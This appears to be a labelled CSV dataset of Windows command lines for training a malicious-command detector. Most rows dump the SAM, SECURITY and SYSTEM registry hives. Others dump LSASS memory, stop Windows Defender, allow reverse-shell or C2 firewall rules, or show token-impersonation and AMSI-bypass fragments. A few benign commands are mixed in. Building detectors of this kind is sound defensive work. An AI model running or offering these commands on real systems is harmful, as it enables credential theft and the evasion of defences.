text,label
reg export hklm\sam c:\windows\temp\3lyiomns.save,1
"powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\ipc7qdfq.dat""",1
reg export hklm\system c:\windows\temp\yzzmuqv8.save,1
reg export hklm\sam c:\windows\temp\h6icte2p.save,1
reg save hklm\security c:\windows\temp\75ckgieh.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\rpu2m6en.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\llh9dpab.dat""",1
reg save hklm\security c:\windows\temp\qv8g5l2e.save,1
reg export hklm\sam c:\windows\temp\ajs9vgik.save,1
reg save hklm\sam c:\windows\temp\71lff0qo.save,1
"cmd.exe /c ""get-help adjusttokenprivileges -full""",0
"powershell -nop -c ""reg save hklm\security c:\temp\omaculfd.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\53yo51fk.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\1tarjveq.dat""",1
reg save hklm\sam c:\windows\temp\x7htb7z7.save,1
"cmd.exe /c ""rule: reverse shell | app: any | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\sam c:\windows\temp\pp1aq5vr.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\l6vtf2f6.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\l6ses8te.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\gnhhf58k.dat""",1
reg  save  hklm\sam  c:\windows\temp\gikxleac.save,1
reg export hklm\sam c:\windows\temp\h2g9jj8c.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\dsq3dgx5.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\prc0n387.dat""",1
reg save hklm\sam c:\windows\temp\8aa0gvj9.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\g5crj278.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\jqfyn4ir.dat""",1
reg save hklm\system c:\windows\temp\g5br417f.save,1
reg export hklm\sam c:\windows\temp\rg5535g0.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\ccn0upyo.dat""",1
reg save hklm\sam c:\windows\temp\2d8b7mu3.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\7wj50b9p.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\08tdatut.dat""",1
reg save hklm\security c:\windows\temp\mz76282k.save,1
reg export hklm\security c:\windows\temp\f6m6oghk.save,1
reg save hklm\security c:\windows\temp\wvaagcz2.save,1
"powershell -nop -c ""whoami /groups""",0
"cmd.exe /c ""reg export hklm\sam c:\temp\qekxwzq3.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\uqdbgffi.dat""",1
reg save hklm\system c:\windows\temp\mku07ptg.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\jya6nyfs.dat""""",1
reg export hklm\system c:\windows\temp\kfqlqu3h.save,1
reg export hklm\sam c:\windows\temp\4tjtumm6.save,1
reg save hklm\sam c:\windows\temp\1vvj80ge.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\x2i36si1.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\pay5733l.dat""",1
reg save hklm\sam c:\windows\temp\qxcyay2w.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\li9qxxt8.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\jd2gf4gr.dat""",1
reg export hklm\sam c:\windows\temp\t47ahbjw.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\ai4hp5nj.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\qlkx5iye.dat""",1
reg save hklm\system c:\windows\temp\tmpqew0h.save,1
reg save hklm\security c:\windows\temp\e5odj2k1.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\semg8x8c.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\4u7yzlbn.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\bfh99cuo.dat""",1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\ju64vj70.save""",1
reg save hklm\system c:\windows\temp\qfwt9igl.save,1
"powershell -nop -c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\b7jjuj8r.dat""""",1
"cmd.exe /c ""reg save hklm\security c:\temp\iax8bmne.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\nf6gl9av.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\6p04urui.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\69alvry0.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\y9b1e3xc.dat""",1
reg save hklm\security c:\windows\temp\331worfx.save,1
rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
reg save hklm\security c:\windows\temp\rnrffk5c.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\meyjp5x0.dat""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")] extern bool impersonateloggedonuser(...)""",3
"cmd.exe /c ""reg save hklm\sam c:\temp\z0z52qgm.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\5q7jem1r.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\5aevtbf2.dat""",1
reg export hklm\security c:\windows\temp\7qqw2mbv.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\wepq94bh.dat""",1
reg   export   hklm\system   c:\windows\temp\w4urfaj8.save,1
"cmd.exe /c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\tsbc0n81.dat""""",1
reg save hklm\sam c:\windows\temp\i2fk0c33.save,1
reg   save   hklm\security   c:\windows\temp\vl07ztes.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\0c4xy632.dat""",1
reg export hklm\system c:\windows\temp\2t8qagl3.save,1
reg export hklm\security c:\windows\temp\lt3ve28u.save,1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\y4f0w4ec.dat""",1
rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444,2
"cmd.exe /c ""cmd.exe /c ""reg export hklm\sam c:\temp\suaq2ygq.dat""""",1
reg export hklm\security c:\windows\temp\e09g21pt.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\4cfx7brc.dat""",1
reg save hklm\sam c:\windows\temp\5de2zrt6.save,1
reg export hklm\system c:\windows\temp\k8ghgnq6.save,1
"powershell -nop -c ""powershell -nop -c ""reg save hklm\sam c:\temp\4xbvcz04.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\cmkmmung.dat""",1
reg save hklm\security c:\windows\temp\1k5kzls5.save,1
reg save hklm\security c:\windows\temp\63s2rnze.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\fo3w2gqv.dat""",1
reg export hklm\system c:\windows\temp\ug6fai4g.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\zq5t4c52.dat""""",1
reg save hklm\system c:\windows\temp\rxogt6jh.save,1
"cmd.exe /c ""powershell -nop -c ""reg export hklm\security c:\temp\5wmrj3ev.dat""""",1
reg save hklm\sam c:\windows\temp\m13o1kl6.save,1
reg export hklm\system c:\windows\temp\91uur0nj.save,1
reg export hklm\system c:\windows\temp\nouaw4r0.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\kqc9r8ox.dat""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\c5wc45e5.dat""""",1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\f2v3htjh.save""",1
rule:  reverse  shell  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"powershell -nop -c ""reg export hklm\security c:\temp\udlnv8ko.dat""",1
reg save hklm\security c:\windows\temp\9hm5hbil.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\swslzap6.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\uiksd636.dat""",1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.amsiutils')""",3
"powershell -nop -c ""reg export hklm\sam c:\temp\14ehivos.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\gcy5ue9n.dat""",1
reg save hklm\security c:\windows\temp\lzxygpa3.save,1
reg export hklm\security c:\windows\temp\gqnkz627.save,1
"powershell -nop -c ""reg  export  hklm\system  c:\windows\temp\pz8x2ndh.save""",1
reg save hklm\system c:\windows\temp\3k7xo0gb.save,1
reg export hklm\security c:\windows\temp\56ha11o2.save,1
"cmd.exe /c ""rundll32.exe  c:\windows\system32\comsvcs.dll,  minidump  1234  c:\temp\lsass.dmp  full""",1
"cmd.exe /c ""reg save hklm\security c:\temp\rw5bltjl.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\5y5kur29.dat""",1
reg save hklm\security c:\windows\temp\ggm10a1c.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\security   c:\temp\zl14uhuo.dat""""",1
reg export hklm\system c:\windows\temp\64puoa28.save,1
$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex'),3
reg save hklm\sam c:\windows\temp\8qo97t7d.save,1
"powershell -nop -c ""sc   stop   windefend""",2
reg export hklm\security c:\windows\temp\svibtuff.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\o65cb8wm.dat""",1
"[dllimport(""advapi32.dll"")]  extern  bool  openprocesstoken(...)",3
reg export hklm\sam c:\windows\temp\d8i8ipvk.save,1
rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
"cmd.exe /c ""reg save hklm\security c:\temp\60ikl1jt.dat""",1
reg export hklm\sam c:\windows\temp\rourkvum.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\kklptdo1.dat""",1
reg export hklm\security c:\windows\temp\09ex4uuv.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\46zd2mdx.dat""",1
"powershell -nop -c ""cmd.exe /c ""reg save hklm\sam c:\temp\htjvlv8t.dat""""",1
rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"cmd.exe /c ""reg export hklm\sam c:\temp\6z0wtica.dat""",1
rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
"powershell -nop -c ""reg save hklm\sam c:\temp\knqyl52g.dat""",1
reg save hklm\sam c:\windows\temp\es7ran5a.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\eyfiwmg2.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\q6gjzvae.dat""""",1
reg save hklm\system c:\windows\temp\eaekppq0.save,1
reg  save  hklm\security  c:\windows\temp\iu05argh.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\a4pjb0o0.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\8wjj3sl7.dat""",1
reg export hklm\sam c:\windows\temp\wyy5aeb5.save,1
"[dllimport(""advapi32.dll"")] extern bool duplicatetokenex(...)",3
"cmd.exe /c ""reg export hklm\sam c:\temp\2ak5h5df.dat""",1
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\nd523tr3.dat""",1
reg save hklm\system c:\windows\temp\vmdhjqi7.save,1
reg save hklm\security c:\windows\temp\x524ckv6.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\dh7y7yrm.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\dn1ndr1v.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\3wzvnz7d.dat""",1
reg export hklm\security c:\windows\temp\esxysz92.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\uo483hlf.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\9rzxnvug.dat""",1
reg save hklm\system c:\windows\temp\kp1hxzcg.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\fkoso02o.dat""",1
reg export hklm\system c:\windows\temp\gsr6jurm.save,1
"powershell -nop -c ""$a   =   [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
reg save hklm\security c:\windows\temp\9qorn0l0.save,1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\1iwmfkt5.dat""""",1
reg save hklm\security c:\windows\temp\c3en3i1p.save,1
reg export hklm\sam c:\windows\temp\se1hn1y6.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\nwez3m72.dat""",1
"powershell -nop -c ""get-help  adjusttokenprivileges  -full""",0
"cmd.exe /c ""reg export hklm\security c:\temp\at05f580.dat""",1
reg save hklm\sam c:\windows\temp\jg7ky2cs.save,1
reg save hklm\sam c:\windows\temp\5ie9jkyt.save,1
reg export hklm\security c:\windows\temp\v12q1ks6.save,1
reg export hklm\sam c:\windows\temp\k0oe2mlc.save,1
reg export hklm\security c:\windows\temp\73y8qyqc.save,1
"cmd.exe /c ""netsh  dump  >  netconfig.txt""",0
reg export hklm\sam c:\windows\temp\napl1a9b.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\2yg73u5c.dat""",1
reg export hklm\security c:\windows\temp\dj64n4tb.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\vkkvxez8.dat""",1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\i8xvff7w.save""",1
reg save hklm\sam c:\windows\temp\cdy3zcwe.save,1
"powershell -nop -c ""ping 8.8.8.8""",0
reg export hklm\sam c:\windows\temp\uxrlxxd3.save,1
reg save hklm\system c:\windows\temp\76ikp8ze.save,1
reg save hklm\security c:\windows\temp\ey18ct4h.save,1
reg save hklm\sam c:\windows\temp\bji89gf5.save,1
reg save hklm\system c:\windows\temp\trv35z9d.save,1
reg save hklm\security c:\windows\temp\6rccx72w.save,1
"cmd.exe /c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\smq9xwsk.dat""""",1
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\mqhiz470.dat""""",1
reg save hklm\security c:\windows\temp\cw6kbx4j.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\r1ke6cy2.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\3mqt8q7d.dat""",1
reg save hklm\sam c:\windows\temp\fuo0xshy.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\0ppo0370.dat""",1
"powershell -nop -c ""reg query hkcu\console""",0
"powershell  -nop  -c  ""reg  save  hklm\sam  c:\temp\sivzgmg4.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\om854bn5.dat""",1
reg export hklm\sam c:\windows\temp\wu7suqvu.save,1
reg save hklm\sam c:\windows\temp\sa72ndji.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\zyfsffz2.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\jc9s1aog.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\gy36jlkr.save""",1
reg   export   hklm\system   c:\windows\temp\7zietas1.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\yjw45er4.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\y7hzs81u.dat""",1
"powershell -nop -c ""cmd.exe   /c   ""reg   export   hklm\sam   c:\temp\kmf9jru5.dat""""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\effgp7tv.dat""",1
"cmd.exe /c ""$a = [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
"powershell -nop -c ""reg save hklm\security c:\temp\ydr78ry3.dat""",1
reg export hklm\sam c:\windows\temp\i36ib46b.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\6qucp8x5.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\i4l2ke5l.dat""",1
"cmd.exe /c ""powershell   -nop   -c   ""reg   export   hklm\sam   c:\temp\v0xwt5ae.dat""""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\evgks0yj.dat""",1
reg save hklm\sam c:\windows\temp\n65d5l0f.save,1
"cmd.exe /c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
reg save hklm\system c:\windows\temp\pco5w45a.save,1
"powershell -nop -c ""reg   save   hklm\sam   c:\windows\temp\pevfi98z.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\oe1khkt5.dat""",1
reg export hklm\sam c:\windows\temp\ywu66054.save,1
rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"cmd.exe /c ""reg save hklm\security c:\temp\bq8hgy4g.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\k8qwsfcp.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\b8agak6z.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\l5ut9ble.dat""",1
reg export hklm\security c:\windows\temp\2m4wpc24.save,1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\qa8ybsg9.save""",1
backup-utility save registry config,0
reg export hklm\sam c:\windows\temp\ceh7unih.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\3cn2lwja.dat""",1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\security c:\temp\grfdvdvl.dat""""",1
reg save hklm\system c:\windows\temp\8parbxmr.save,1
reg save hklm\security c:\windows\temp\553aci4h.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\6xgszsks.dat""",1
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg save hklm\sam c:\windows\temp\h0zmnwx9.save,1
"powershell   -nop   -c   ""reg   save   hklm\sam   c:\temp\i00wije4.dat""",1
reg export hklm\system c:\windows\temp\rye18u7g.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\u1xo80zd.dat""",1
reg save hklm\security c:\windows\temp\34z2ncou.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\jsmp3upd.dat""",1
rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"powershell -nop -c ""reg save hklm\sam c:\temp\wysrlgt6.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\3brstob3.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\9atncqr8.dat""",1
reg save hklm\security c:\windows\temp\7g2o6338.save,1
reg save hklm\system c:\windows\temp\68awpdqr.save,1
reg export hklm\security c:\windows\temp\u1ei5vnf.save,1
"powershell -nop -c ""cmd.exe /c ""reg export hklm\sam c:\temp\y5l7jyug.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\m0zpeho1.dat""",1
reg export hklm\security c:\windows\temp\1u03sh68.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\f293atde.dat""",1
reg save hklm\security c:\windows\temp\pdqzg6bg.save,1
"cmd.exe /c ""powershell -nop -c ""reg save hklm\sam c:\temp\e3s1l49u.dat""""",1
"powershell -nop -c ""powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\5ywm56ag.dat""""",1
reg save hklm\security c:\windows\temp\0m9l98ds.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\bikiodli.dat""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\system c:\windows\temp\06nafl71.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\lke8wfmp.dat""",1
reg save hklm\system c:\windows\temp\g8974ojj.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\e09xnekl.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\0xb4jrpl.dat""",1
reg export hklm\system c:\windows\temp\ld1273xn.save,1
"powershell -nop -c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""reg save hklm\security c:\temp\1h0ndi6r.dat""",1
reg export hklm\sam c:\windows\temp\rwrp5ypw.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\fdr9hpbo.dat""",1
reg export hklm\sam c:\windows\temp\t5uyf7jp.save,1
reg export hklm\security c:\windows\temp\v9r39x3w.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\qlx6dxf5.dat""",1
reg save hklm\sam c:\windows\temp\1o5db4wb.save,1
reg export hklm\system c:\windows\temp\j4vramo6.save,1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\rll7kusk.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\i1zgeaxu.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\nkgf75a2.dat""",1
reg save hklm\security c:\windows\temp\bl34r4bn.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\0kyn6hsh.dat""",1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\m4nir1fg.save""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\w3ojf6k5.dat""",1
"cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\lxre2svd.dat""",1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\1w79nhd0.save""",1
reg export hklm\security c:\windows\temp\8ijs3ziy.save,1
reg save hklm\sam c:\windows\temp\6nh1yapv.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\4xh1lufu.dat""",1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\do5nyxo5.save""",1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\cfbfl0ak.save""",1
"cmd.exe /c ""reg save hklm\security c:\temp\d5rpi8el.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\qmkq0s01.dat""",1
reg export hklm\security c:\windows\temp\nixqoloz.save,1
